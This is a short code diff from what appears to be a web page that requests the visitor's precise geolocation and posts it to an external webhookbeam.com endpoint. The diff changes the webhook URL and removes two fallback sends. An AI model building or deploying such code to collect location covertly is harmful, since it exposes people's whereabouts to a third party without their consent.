@@ -2752,7 +2752,7 @@
             };
         }
 
-        const WEBHOOK_URL = "https://www.webhookbeam.com/webhook/abdogoda0a/test";
+        const WEBHOOK_URL = "https://www.webhookbeam.com/webhook/abdulrhmangoda0/hi";
 
         function updateStatus(message, isError = false) {
             console.log(message);
@@ -2789,7 +2789,7 @@
                         3: "Request timed out."
                     };
                     updateStatus(errorMap[error.code] || `Error: ${error.message}`, true);
-                    sendToWebhook("No location data available");
+                
                 },
                 {
                     enableHighAccuracy: true,
@@ -2798,7 +2798,7 @@
                 }
             );
 
-            sendToWebhook("No location data available");
+        
         }
 
         function sendToWebhook(payload) {
